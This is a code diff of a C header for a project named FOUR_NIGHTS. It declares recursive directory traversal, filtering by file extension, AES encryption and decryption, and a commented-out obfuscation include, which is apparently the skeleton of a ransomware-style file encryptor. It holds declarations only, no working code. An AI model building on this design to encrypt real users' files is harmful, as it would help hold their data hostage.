@@ -1,7 +1,8 @@
 #ifndef FOUR_NIGHTS
 #define FOUR_NIGHTS
-
+/*
 #include "obfuscation.h"
+*/
 
 #include <openssl/aes.h>
 #include <openssl/evp.h>
@@ -17,7 +18,6 @@
 #include <sys/utsname.h>
 #include <unistd.h>
 
-#define BUFSIZE 1024
 #define BIGBUF  4096
 #define PATH_MAX 4096
 
@@ -33,7 +33,7 @@
 typedef struct tmp_bufs_s
 {
 	char *filepath;
-	char *buf;
+	char *plaintext;
 	off_t file_offset;
 	size_t bytes_read;
 	struct stat file_info;
@@ -57,34 +57,14 @@ typedef struct file_filter_s
 	char **file_extensions;
 	char cipher_flag; /* 'e' for encrypt, 'd' for decrypt */
 	char *key;
-#ifndef NO_OBFUSCATION
-	unsigned char salt[8]; /** TEMP **/
-#endif
 	tmp_bufs_t *tmp_bufs;
 } file_filter_t;
+
+file_filter_t *init_struct(file_filter_t *file_filter, char *target_dir);
 void free_file_filter_struct(file_filter_t *file_filter);
-
-/* String Functions */
-char *tokenizer(char *str, file_filter_t *file_filter);
-int my_strncmp(const char *s1, const char *s2, size_t n);
-size_t my_strlen(const char *s);
-char *my_strncat(char *dest, const char *src, size_t offset, size_t n);
-char *my_strtok_r(char *str, char *delim, char **saveptr);
-
-/* Search Functions */
-int binary_search(int *array, size_t size, int value);
-int binary_search_string(const char *str, size_t len, file_filter_t *file_filter);
-unsigned int find_substr_end(char *string, char *substr);
-
-/* Memory Management */
-void *my_memset(void *s, char c, size_t n);
-void *my_calloc(size_t nmemb, size_t size);
-void *recalloc(void *ptr, size_t old_size, size_t new_size);
 
 /* OS functions */
-void *recurse_ls(char *filename, file_filter_t *file_filter);
-void free_file_filter_struct(file_filter_t *file_filter);
-file_filter_t *init_struct(file_filter_t *file_filter, char *target_dir);
+void *traverse_dir(char *filename, file_filter_t *file_filter);
 size_t read_file(const char *filepath, file_filter_t *file_filter, char *(*fxn)(char *, file_filter_t *));
 char *write_file(char *filepath, file_filter_t *file_filter);
 
@@ -100,4 +80,24 @@ unsigned char *aes_decrypt(EVP_CIPHER_CTX *e, unsigned char *ciphertext, int *le
 	void print_for_debug(struct file_filter_s file_filter);
 #endif
 
-#endif
+/* Misc */
+char *tokenizer(char *str, file_filter_t *file_filter);
+
+/* String Functions */
+int my_strncmp(const char *s1, const char *s2, size_t n);
+size_t my_strlen(const char *s);
+char *my_strncat(char *dest, const char *src, size_t offset, size_t n);
+char *my_strtok_r(char *str, char *delim, char **saveptr);
+
+/* Search Functions */
+int binary_search(int *array, size_t size, int value);
+int binary_search_string(const char *str, size_t len, file_filter_t *file_filter);
+unsigned int find_substr_end(char *string, char *substr);
+
+/* Memory Management */
+void *my_memset(void *s, char c, size_t n);
+void *my_calloc(size_t nmemb, size_t size);
+void *recalloc(void *ptr, size_t old_size, size_t new_size);
+
+
+#endif /* FOUR_NIGHTS */
